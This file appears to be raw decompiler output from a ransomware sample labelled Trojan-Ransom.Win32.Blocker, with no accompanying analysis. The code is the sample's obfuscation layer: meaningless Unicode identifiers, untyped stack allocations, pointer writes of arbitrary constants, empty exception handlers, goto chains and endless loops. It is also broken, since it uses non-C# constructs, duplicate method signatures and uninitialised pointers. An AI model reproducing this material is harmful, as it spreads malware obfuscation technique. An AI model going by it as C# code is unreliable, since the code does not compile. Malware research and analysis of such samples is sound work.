// Decompiled with JetBrains decompiler
// Type: .
// Assembly: Fail, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 7F29B1F3-14FC-4E06-B710-D2A77CC31975
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00050-msil\Trojan-Ransom.Win32.Blocker.ajjv-b6e273da85365ed273f0d22ed006038ae7a5d875.exe

using \u0003;
using \u0004;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Runtime.InteropServices;

namespace \u0002
{
  internal class \u0005
  {
    static unsafe object \u0001([In] \u0003.\u0003 obj0)
    {
      int num1 = 50;
      while (true)
      {
        // ISSUE: untyped stack allocation
        void* voidPtr = (void*) __untypedstackalloc(num1);
label_7:
        *(long*) voidPtr = 94L;
        do
        {
          *(long*) ((IntPtr) voidPtr + 8) = 1044L;
          *(sbyte*) ((IntPtr) voidPtr + 48) = (sbyte) 0;
          *(int*) ((IntPtr) voidPtr + 40) = 185403;
          *(long*) ((IntPtr) voidPtr + 16) = 776847L;
        }
        while (false);
        *(double*) ((IntPtr) voidPtr + 24) = 4327595.0;
        *(long*) voidPtr = 49438L;
        int num2 = 39584;
        if (num2 == 0)
        {
          num1 = num2;
        }
        else
        {
          Decimal num3 = new Decimal((long) num2);
          *(int*) ((IntPtr) voidPtr + 44) = 1;
          *(long*) ((IntPtr) voidPtr + 32) = 97L;
          *(sbyte*) ((IntPtr) voidPtr + 49) = (sbyte) 1;
          do
          {
            if (true)
              *(long*) voidPtr = 1L;
            else
              break;
          }
          while (true);
          goto label_7;
        }
      }
    }

    static unsafe void \u0001([In] \u0002 obj0)
    {
label_0:
      void* voidPtr1;
      if (true)
      {
        // ISSUE: untyped stack allocation
        voidPtr1 = (void*) __untypedstackalloc(40);
      }
      *(long*) ((IntPtr) voidPtr1 + 8) = 0L;
      try
      {
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        do
        {
          void* voidPtr2;
          *(double*) ((IntPtr) voidPtr2 + 16) = -2029476534.0;
          if (true)
          {
            if (true)
              *(double*) ((IntPtr) voidPtr2 + 24) = 0.4127668;
            else
              goto label_10;
          }
        }
        while (false);
        \u0002.\u0001(190);
        ProjectData.ClearProjectError();
      }
label_10:
      do
      {
        *(long*) ((IntPtr) voidPtr1 + 32) = 0L;
      }
      while (true);
      goto label_0;
    }

    static unsafe object \u0001()
    {
      int num1 = 35;
      void* voidPtr1;
      while (true)
      {
        // ISSUE: untyped stack allocation
        voidPtr1 = (void*) __untypedstackalloc(num1);
        void* voidPtr2;
        try
        {
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          while (true)
          {
            do
            {
              *(sbyte*) ((IntPtr) voidPtr2 + 34) = (sbyte) 0;
              *(long*) ((IntPtr) voidPtr2 + 16) = 290L;
            }
            while (false);
          }
        }
        int num2;
        do
        {
          *(long*) ((IntPtr) voidPtr1 + 8) = 535L;
          *(int*) ((IntPtr) voidPtr1 + 24) = 298165441;
          try
          {
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            do
            {
              \u0002.\u0001(211);
            }
            while (false);
            *(int*) ((IntPtr) voidPtr2 + 28) = 647821188;
            while (true)
              ;
          }
          do
          {
            do
            {
              *(long*) voidPtr1 = 8246L;
              *(sbyte*) ((IntPtr) voidPtr1 + 32) = (sbyte) 0;
            }
            while (false);
            num2 = 517;
            if (num2 != 0)
            {
              \u0002.\u0001(num2);
              if (true)
                ;
              *(sbyte*) ((IntPtr) voidPtr1 + 33) = (sbyte) 1;
            }
            else
              goto label_12;
          }
          while (false);
        }
        while (false);
        break;
label_12:
        num1 = num2;
      }
      *(sbyte*) ((IntPtr) voidPtr1 + 32) = (sbyte) 1;
      *(long*) voidPtr1 = 9800032L;
      while (true)
        ;
    }

    static object \u0001([In] \u0003.\u0003 obj0)
    {
      while (true)
        ;
    }

    static void \u0001()
    {
      while (true)
        ;
    }

    static unsafe void \u0001([In] \u0002 obj0)
    {
label_0:
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(12);
label_1:
      if (true)
      {
        \u0002.\u0001(642);
        if (true)
          goto label_4;
label_3:
        do
        {
          if (true)
            *(int*) ((IntPtr) voidPtr + 8) = -1220544182;
          else
            goto label_0;
        }
        while (true);
        goto label_1;
label_4:
        goto label_3;
      }
      else
        goto label_0;
    }

    static unsafe void \u0001([In] \u0002 obj0)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr1 = (void*) __untypedstackalloc(117);
label_1:
      if (true)
        goto label_12;
label_2:
      void* voidPtr2;
      try
      {
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        *(double*) ((IntPtr) voidPtr2 + 16) = 0.5795186;
        do
        {
          *(double*) ((IntPtr) voidPtr2 + 8) = 806019691.0;
          *(int*) ((IntPtr) voidPtr2 + 88) = -1946308483;
          *(long*) voidPtr2 = 0L;
        }
        while (false);
        \u0002.\u0001(828);
        *(int*) ((IntPtr) voidPtr2 + 92) = 618097758;
        ProjectData.ClearProjectError();
      }
      *(double*) ((IntPtr) voidPtr1 + 32) = 0.9495566;
      if (true)
      {
        while (*(double*) ((IntPtr) voidPtr1 + 32) <= 0.3640187)
        {
          *(double*) ((IntPtr) voidPtr1 + 40) = 0.05350453;
          *(double*) ((IntPtr) voidPtr1 + 24) = 2018398836.0;
          *(double*) ((IntPtr) voidPtr1 + 48) = 699235073.0;
          try
          {
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            *(int*) ((IntPtr) voidPtr2 + 104) = -1113041452;
            *(double*) ((IntPtr) voidPtr2 + 72) = 2073623141.0;
            *(double*) ((IntPtr) voidPtr2 + 64) = -1162053894.0;
            *(int*) ((IntPtr) voidPtr2 + 100) = -1309732958;
            *(double*) ((IntPtr) voidPtr2 + 56) = -625684086.0;
            *(int*) ((IntPtr) voidPtr2 + 108) = -1092527747;
            *(int*) ((IntPtr) voidPtr2 + 96) = 389351893;
            ProjectData.ClearProjectError();
          }
          *(double*) ((IntPtr) voidPtr1 + 32) = *(double*) ((IntPtr) voidPtr1 + 32) + 1.0;
        }
        *(sbyte*) ((IntPtr) voidPtr1 + 116) = (sbyte) 1;
        *(double*) ((IntPtr) voidPtr1 + 80) = 0.1030226;
        do
        {
          *(int*) ((IntPtr) voidPtr1 + 112) = -807805943;
          *(double*) ((IntPtr) voidPtr1 + 80) = *(double*) ((IntPtr) voidPtr1 + 80) + 1.0;
        }
        while (*(double*) ((IntPtr) voidPtr1 + 80) <= 0.7988844);
        return;
      }
      goto label_1;
label_12:
      goto label_2;
    }
  }
}
